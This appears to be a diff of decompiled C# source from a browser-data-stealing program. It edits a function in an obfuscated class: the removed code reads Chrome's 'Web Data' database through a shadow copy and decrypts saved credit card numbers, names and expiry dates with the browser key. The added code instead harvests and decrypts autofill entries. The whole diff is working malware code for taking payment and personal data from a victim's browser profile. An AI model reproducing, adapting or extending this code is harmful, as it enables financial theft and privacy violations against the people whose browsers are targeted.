@@ -233,10 +233,9 @@ public static class Chr_0_M_e
 		return list;
 	}
 
-	// Token: 0x06000005 RID: 5 RVA: 0x00004C9C File Offset: 0x00002E9C
-	private static List<CC> ScanCC(string profilePath)
+	private static List<Autofill> ScanFills(string profilePath)
 	{
-		List<CC> list = new List<CC>();
+		List<Autofill> list = new List<Autofill>();
 		try
 		{
 			string text = Path.Combine(profilePath, "Web Data");
@@ -244,45 +243,46 @@ public static class Chr_0_M_e
 			{
 				return list;
 			}
-			string chromeKey = Chr_0_M_e.ReadKey(profilePath);
-			using (FileCopier fileCopier = new FileCopier())
+			string chromeKey = ReadKey(profilePath);
+			using FileCopier fileCopier = new FileCopier();
+			try
 			{
-				try
+				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
+				dbFactory.ReadContextTable("autofill");
+				for (int i = 0; i < dbFactory.RowLength; i++)
 				{
-					DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
-					dbFactory.ReadContextTable("credit_cards");
-					for (int i = 0; i < dbFactory.RowLength; i++)
+					Autofill autofill = null;
+					try
 					{
-						CC cc = null;
-						try
+						string text2 = dbFactory.GatherValue(i, "value").Trim();
+						if (text2.StartsWith("v10") || text2.StartsWith("v11"))
 						{
-							string number = Chr_0_M_e.DecryptChromium(dbFactory.GatherValue(i, "card_number_encrypted"), chromeKey).Replace(" ", string.Empty);
-							cc = new CC
-							{
-								HolderName = dbFactory.GatherValue(i, "name_on_card").Trim(),
-								Month = Convert.ToInt32(dbFactory.GatherValue(i, "expiration_month").Trim()),
-								Year = Convert.ToInt32(dbFactory.GatherValue(i, "expiration_year").Trim()),
-								Number = number
-							};
+							text2 = DecryptChromium(text2, chromeKey);
 						}
-						catch
-						{
-						}
-						if (cc != null)
-						{
-							list.Add(cc);
-						}
+						Autofill autofill2 = new Autofill();
+						autofill2.Name = dbFactory.GatherValue(i, "name").Trim();
+						autofill2.Value = text2;
+						autofill = autofill2;
+					}
+					catch
+					{
+					}
+					if (autofill != null)
+					{
+						list.Add(autofill);
 					}
 				}
-				catch
-				{
-				}
+				return list;
+			}
+			catch (Exception)
+			{
+				return list;
 			}
 		}
 		catch (Exception)
 		{
+			return list;
 		}
-		return list;
 	}
 
 	// Token: 0x06000006 RID: 6 RVA: 0x00004E58 File Offset: 0x00003058
